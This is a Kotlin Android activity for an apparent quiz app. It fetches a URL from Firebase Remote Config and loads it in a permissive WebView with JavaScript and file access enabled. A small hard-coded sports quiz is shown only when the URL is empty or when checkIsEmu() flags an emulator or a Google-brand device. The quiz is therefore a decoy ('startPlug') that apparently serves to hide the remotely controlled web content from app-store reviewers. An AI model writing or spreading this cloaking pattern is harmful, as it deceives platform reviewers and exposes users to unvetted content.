package com.radzhab.quizyeasy

import android.content.Intent
import android.net.Uri
import android.os.*
import android.provider.MediaStore
import android.util.Log
import android.view.View
import android.webkit.*
import android.widget.Button
import android.widget.Toast
import androidx.activity.OnBackPressedCallback
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.fragment.app.FragmentManager
import androidx.fragment.app.FragmentTransaction
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ConfigUpdate
import com.google.firebase.remoteconfig.ConfigUpdateListener
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigException
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.radzhab.quizyeasy.databinding.ActivityMainBinding
import com.radzhab.quizyeasy.fragment.ResultFragment
import com.radzhab.quizyeasy.model.QuestionModel
import com.radzhab.quizyeasy.network.NetworkConnection
import kotlinx.coroutines.*
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private var mUploadMessage: ValueCallback<Uri?>? = null
    private var mCapturedImageURI: Uri? = null
    private var mFilePathCallback: ValueCallback<Array<Uri>>? = null
    private var mCameraPhotoPath: String? = null

    private lateinit var binding: ActivityMainBinding

    lateinit var remoteConfig: FirebaseRemoteConfig
    private lateinit var webView: WebView
    var questionsList: ArrayList<QuestionModel> = ArrayList()
    private var index: Int = 0
    lateinit var questionModel: QuestionModel
    private var correctAnswerCount: Int = 0
    private var wrongAnswerCount: Int = 0
    private var url = ""
    private var backPressedTime: Long = 0
    private var backToast: Toast? = null
    lateinit var countDownTimer: CountDownTimer
    var isCreated: Boolean = false

    @Throws(IOException::class)
    private fun createImageFile(): File {
        // Create an image file name
        val timeStamp =
            SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
        val imageFileName = "JPEG_" + timeStamp + "_"
        val storageDir = Environment.getExternalStoragePublicDirectory(
            Environment.DIRECTORY_PICTURES
        )
        return File.createTempFile(
            imageFileName,  /* prefix */
            ".jpg",  /* suffix */
            storageDir /* directory */
        )
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        val view = binding.root
        setContentView(view)
        supportActionBar?.hide()
        initFirebaseRemoteConfig()
        url = remoteConfig.getString("url")

        if (url.isNotEmpty() && !isCreated) {
            checkConnection(savedInstanceState)
        } else {
            getConfig(savedInstanceState)
        }
    }

    override fun onSaveInstanceState(outState: Bundle) {
        webView.saveState(outState)
        super.onSaveInstanceState(outState)
    }

    private fun checkConnection(savedInstanceState: Bundle?) {
        val networkConnection = NetworkConnection(applicationContext)
        networkConnection.observe(this) { isConnected ->
            if (!isCreated) {
                if (isConnected) {
                    Toast.makeText(this, "Connected", Toast.LENGTH_SHORT).show()
                    startWeb(url, savedInstanceState)
                } else {
                    Toast.makeText(
                        this,
                        "A network connection is required to continue",
                        Toast.LENGTH_SHORT
                    ).show()
                }
                isCreated = true
            }
        }
    }

    private fun initFirebaseRemoteConfig() {
        remoteConfig = Firebase.remoteConfig
        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }
        remoteConfig.setConfigSettingsAsync(configSettings)
        //Default url value
//        remoteConfig.setDefaultsAsync(R.xml.remote_config_defaults)
    }

    private fun getConfig(savedInstanceState: Bundle?) {
        //Fetch and activate values
        try {
            remoteConfig.fetchAndActivate()
                .addOnCompleteListener(this) { task ->
                    if (task.isSuccessful) {
                        url = remoteConfig.getString("url")
                    } else {
                        Toast.makeText(
                            this,
                            "Fetch failed",
                            Toast.LENGTH_SHORT,
                        ).show()
                    }
                    if (url == "" || checkIsEmu()) {
                        startPlug()
                    } else {
                        startWeb(url, savedInstanceState)
                    }
                    displayWelcomeMessage()
                }
        } catch (e: Exception) {
            Toast.makeText(
                this,
                "Fetch and activate succeeded exception",
                Toast.LENGTH_LONG,
            ).show()
            e.printStackTrace()
        }

        //Listen for updates in real time
        remoteConfig.addOnConfigUpdateListener(object : ConfigUpdateListener {
            override fun onUpdate(configUpdate: ConfigUpdate) {
                Log.d(TAG, "Updated keys: " + configUpdate.updatedKeys)

                if (configUpdate.updatedKeys.contains("welcome_message")) {
                    remoteConfig.activate().addOnCompleteListener {
                        displayWelcomeMessage()
                    }
                }
            }

            override fun onError(error: FirebaseRemoteConfigException) {
                Log.w(TAG, "Config update error with code: " + error.code, error)
            }
        })
    }

    private fun displayWelcomeMessage() {
        println("displayWelcomeMessage")
    }

    private fun startWeb(url: String, savedInstanceState: Bundle?) {
        onBackOverrideWebView()
        binding.mainWebView.visibility = View.VISIBLE
        webView = binding.mainWebView
        webView.webViewClient = WebViewClient()
        webView.webChromeClient = ChromeClient()
        val webSettings = webView!!.settings
        webSettings.apply {
            javaScriptEnabled = true
            loadWithOverviewMode = true
            useWideViewPort = true
            domStorageEnabled = true
            databaseEnabled = true
            setSupportZoom(true)
            allowFileAccess = true
            allowContentAccess = true
        }
        if (savedInstanceState != null) {
            webView!!.restoreState(savedInstanceState)
        }
        else {
            webView!!.loadUrl(url)
        }

        webView!!.settings.apply {
            domStorageEnabled = true
            javaScriptCanOpenWindowsAutomatically = true
        }

        val cookieManager = CookieManager.getInstance()
        cookieManager.setAcceptCookie(true)
    }

    inner class ChromeClient : WebChromeClient() {
        // For Android 5.0
        override fun onShowFileChooser(
            view: WebView,
            filePath: ValueCallback<Array<Uri>>,
            fileChooserParams: FileChooserParams
        ): Boolean {
            // Double check that we don't have any existing callbacks
            if (mFilePathCallback != null) {
                mFilePathCallback!!.onReceiveValue(null)
            }
            mFilePathCallback = filePath
            var takePictureIntent: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
            if (takePictureIntent!!.resolveActivity(packageManager) != null) {
                // Create the File where the photo should go
                var photoFile: File? = null
                try {
                    photoFile = createImageFile()
                    takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath)
                } catch (ex: IOException) {
                    // Error occurred while creating the File
                    Log.e("ErrorCreatingFile", "Unable to create Image File", ex)
                }

                // Continue only if the File was successfully created
                if (photoFile != null) {
                    mCameraPhotoPath = "file:" + photoFile.absolutePath
                    takePictureIntent.putExtra(
                        MediaStore.EXTRA_OUTPUT,
                        Uri.fromFile(photoFile)
                    )
                } else {
                    takePictureIntent = null
                }
            }
            val contentSelectionIntent = Intent(Intent.ACTION_GET_CONTENT)
            contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE)
            contentSelectionIntent.type = "image/*"
            val intentArray: Array<Intent?>
            intentArray = takePictureIntent?.let { arrayOf(it) } ?: arrayOfNulls(0)
            val chooserIntent = Intent(Intent.ACTION_CHOOSER)
            chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent)
            chooserIntent.putExtra(Intent.EXTRA_TITLE, "Image Chooser")
            chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray)
            startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODE)
            return true
        }

        // openFileChooser for Android 3.0+
        // openFileChooser for Android < 3.0
        @JvmOverloads
        fun openFileChooser(uploadMsg: ValueCallback<Uri?>?, acceptType: String? = "") {
            mUploadMessage = uploadMsg
            // Create AndroidExampleFolder at sdcard
            // Create AndroidExampleFolder at sdcard
            val imageStorageDir = File(
                Environment.getExternalStoragePublicDirectory(
                    Environment.DIRECTORY_PICTURES
                ), "AndroidExampleFolder"
            )
            if (!imageStorageDir.exists()) {
                // Create AndroidExampleFolder at sdcard
                imageStorageDir.mkdirs()
            }

            // Create camera captured image file path and name
            val file = File(
                imageStorageDir.toString() + File.separator + "IMG_"
                        + System.currentTimeMillis().toString() + ".jpg"
            )
            mCapturedImageURI = Uri.fromFile(file)

            // Camera capture image intent
            val captureIntent = Intent(
                MediaStore.ACTION_IMAGE_CAPTURE
            )
            captureIntent.putExtra(MediaStore.EXTRA_OUTPUT, mCapturedImageURI)
            val i = Intent(Intent.ACTION_GET_CONTENT)
            i.addCategory(Intent.CATEGORY_OPENABLE)
            i.type = "image/*"

            // Create file chooser intent
            val chooserIntent = Intent.createChooser(i, "Image Chooser")

            // Set camera intent to file chooser
            chooserIntent.putExtra(
                Intent.EXTRA_INITIAL_INTENTS, arrayOf<Parcelable>(captureIntent)
            )

            // On select image call onActivityResult method of activity
            startActivityForResult(chooserIntent, FILECHOOSER_RESULTCODE)
        }

        //openFileChooser for other Android versions
        fun openFileChooser(
            uploadMsg: ValueCallback<Uri?>?,
            acceptType: String?,
            capture: String?
        ) {
            openFileChooser(uploadMsg, acceptType)
        }
    }

    public override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode != INPUT_FILE_REQUEST_CODE || mFilePathCallback == null) {
                super.onActivityResult(requestCode, resultCode, data)
                return
            }
            var results: Array<Uri>? = null

            // Check that the response is a good one
            if (resultCode == RESULT_OK) {
                if (data == null) {
                    // If there is not data, then we may have taken a photo
                    if (mCameraPhotoPath != null) {
                        results = arrayOf(Uri.parse(mCameraPhotoPath))
                    }
                } else {
                    val dataString = data.dataString
                    if (dataString != null) {
                        results = arrayOf(Uri.parse(dataString))
                    }
                }
            }
            mFilePathCallback!!.onReceiveValue(results)
            mFilePathCallback = null
        } else if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.KITKAT) {
            if (requestCode != FILECHOOSER_RESULTCODE || mUploadMessage == null) {
                super.onActivityResult(requestCode, resultCode, data)
                return
            }
            if (requestCode == FILECHOOSER_RESULTCODE) {
                if (null == mUploadMessage) {
                    return
                }
                var result: Uri? = null
                try {
                    result = if (resultCode != RESULT_OK) {
                        null
                    } else {

                        // retrieve from the private variable if the intent is null
                        if (data == null) mCapturedImageURI else data.data
                    }
                } catch (e: Exception) {
                    Toast.makeText(
                        applicationContext, "activity :$e",
                        Toast.LENGTH_LONG
                    ).show()
                }
                mUploadMessage!!.onReceiveValue(result)
                mUploadMessage = null
            }
        }
        return
    }

    private fun startPlug() {
        binding.quizLayout.visibility = View.VISIBLE
        onBackOverride()
        resetBackground()
        initQuestionList()
        initButtons()
        questionModel = questionsList[index]
        setAllQuestions()
        countdown()
    }

    fun countdown() {
        val duration: Long = TimeUnit.SECONDS.toMillis(10)

        countDownTimer = object : CountDownTimer(duration, 1000) {
            override fun onTick(millisUntilFinished: Long) {

                val sDuration: String = String.format(
                    Locale.ENGLISH,
                    "%02d:%02d",
                    TimeUnit.MILLISECONDS.toMinutes(millisUntilFinished),
                    TimeUnit.MILLISECONDS.toSeconds(millisUntilFinished) - TimeUnit.MINUTES.toSeconds(
                        TimeUnit.MILLISECONDS.toMinutes(millisUntilFinished)
                    )
                )
                binding.countdown.text = sDuration
            }

            override fun onFinish() {
                countDownTimer.cancel()
                index++
                if (index < questionsList.size) {
                    questionModel = questionsList[index]
                    setAllQuestions()
                    resetBackground()
                    enableButton()
                    countdown()
                } else {
                    gameResult()
                }
            }
        }
        countDownTimer.start()
    }

    private fun correctAns(option: Button) {
        option.background = ContextCompat.getDrawable(this, R.drawable.right_bg)
        correctAnswerCount++
    }

    private fun wrongAns(option: Button) {
        option.background = ContextCompat.getDrawable(this, R.drawable.wrong_bg)
        wrongAnswerCount++
    }

    private fun gameResult() {
        val fragmentManager: FragmentManager = supportFragmentManager
        val fragmentTransaction: FragmentTransaction = fragmentManager.beginTransaction()
        val resultFragment = ResultFragment()
        val b = Bundle()
        b.putString("correct", correctAnswerCount.toString())
        b.putString("total", questionsList.size.toString())
        resultFragment.arguments = b
        fragmentTransaction.add(R.id.frameLayout, resultFragment).commit()
    }

    private fun setAllQuestions() = with(binding) {
        questions.text = questionModel.question
        option1.text = questionModel.option1
        option2.text = questionModel.option2
        option3.text = questionModel.option3
        option4.text = questionModel.option4
    }

    private fun enableButton() = with(binding) {
        option1.isClickable = true
        option2.isClickable = true
        option3.isClickable = true
        option4.isClickable = true
    }

    private fun disableButton() = with(binding) {
        option1.isClickable = false
        option2.isClickable = false
        option3.isClickable = false
        option4.isClickable = false
    }

    private fun resetBackground() = with(binding) {
        option1.background = ContextCompat.getDrawable(this@MainActivity, R.drawable.option_bg)
        option2.background = ContextCompat.getDrawable(this@MainActivity, R.drawable.option_bg)
        option3.background = ContextCompat.getDrawable(this@MainActivity, R.drawable.option_bg)
        option4.background = ContextCompat.getDrawable(this@MainActivity, R.drawable.option_bg)
    }

    private fun initButtons() = with(binding) {
        option1.setOnClickListener {
            disableButton()
            // sleep for one second
            if (questionModel.option1 == questionModel.answer) {
                correctAns(option1)
            } else {
                wrongAns(option1)
            }
            CoroutineScope(Dispatchers.IO).launch {
                delay(1000L)
                runOnUiThread {
                    countDownTimer.onFinish()
                }
            }
        }

        option2.setOnClickListener {
            disableButton()
            if (questionModel.option2 == questionModel.answer) {
                correctAns(option2)
            } else {
                wrongAns(option2)
            }
            CoroutineScope(Dispatchers.IO).launch {
                delay(1000L)
                runOnUiThread {
                    countDownTimer.onFinish()
                }
            }
        }

        option3.setOnClickListener {
            disableButton()
            if (questionModel.option3 == questionModel.answer) {
                correctAns(option3)
            } else {
                wrongAns(option3)
            }
            CoroutineScope(Dispatchers.IO).launch {
                delay(1000L)
                runOnUiThread {
                    countDownTimer.onFinish()
                }
            }
        }

        option4.setOnClickListener {
            disableButton()
            if (questionModel.option4 == questionModel.answer) {
                correctAns(option4)
            } else {
                wrongAns(option4)
            }
            CoroutineScope(Dispatchers.IO).launch {
                delay(1000L)
                runOnUiThread {
                    countDownTimer.onFinish()
                }
            }
        }
    }

    private fun onBackOverride() {
        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                println("Back button pressed")
                if (backPressedTime + 2000 > System.currentTimeMillis()) {
                    backToast?.cancel()
                    finish()
                } else {
                    backToast =
                        Toast.makeText(baseContext, "DOUBLE PRESS TO QUIT GAME", Toast.LENGTH_SHORT)
                    backToast?.show()
                }
                backPressedTime = System.currentTimeMillis()
            }
        })
    }

    private fun onBackOverrideWebView() {
        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                if (webView.canGoBack()) {
                    webView.goBack()
                }
            }
        })
    }

    private fun initQuestionList() {
        questionsList.add(
            QuestionModel(
                "Which swimming style is not allowed in the Olympics?",
                "Butterfly",
                "Backstroke",
                "Freestyle",
                "Dog paddle",
                "Dog paddle"
            )
        )
        questionsList.add(
            QuestionModel(
                "Which of the following is not a water sport?",
                "Paragliding",
                "Cliff diving",
                "Windsurfing",
                "Rowing",
                "Paragliding"
            )
        )
        questionsList.add(
            QuestionModel(
                "Which country has the most Olympic gold medals in swimming?",
                "China",
                "The USA",
                "The UK",
                "Australia",
                "The USA"
            )
        )
        questionsList.add(
            QuestionModel(
                "What year did boxing become a legal sport?",
                "1921",
                "1901",
                "1931",
                "1911",
                "1901"
            )
        )
        questionsList.add(
            QuestionModel(
                "Where is the largest bowling centre located?",
                "US",
                "Japan",
                "Singapore",
                "Finland",
                "Japan"
            )
        )

        questionsList.add(
            QuestionModel(
                "Of all the fighting sports below, which sport wasn’t practised by Bruce Lee?",
                "Wushu",
                "Boxing",
                "Jeet Kune Do",
                "Fencing",
                "Wushu"
            )
        )
        questionsList.add(
            QuestionModel(
                "Where did the term “billiard” originated from?",
                "Italy",
                "Hungary",
                "Belgium",
                "France",
                "France"
            )
        )
        questionsList.shuffle()
    }


    private fun checkIsEmu(): Boolean {
        if (BuildConfig.DEBUG) return false // when developer use this build on         emulator
        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE
        val brand = Build.BRAND
        var result = (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware == "goldfish"
                || Build.BRAND.contains("google")
                || buildHardware == "vbox86"
                || buildProduct == "sdk"
                || buildProduct == "google_sdk"
                || buildProduct == "sdk_x86"
                || buildProduct == "vbox86p"
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
                || buildHardware.lowercase(Locale.getDefault()).contains("nox")
                || buildProduct.lowercase(Locale.getDefault()).contains("nox"))
        if (result) return true
        result = result or (Build.BRAND.startsWith("generic") &&
                Build.DEVICE.startsWith("generic"))
        if (result) return true
        result = result or ("google_sdk" == buildProduct)
        return result
    }

    companion object {
        private const val TAG = "MyLog"
        private const val INPUT_FILE_REQUEST_CODE = 1
        private const val FILECHOOSER_RESULTCODE = 1
    }

}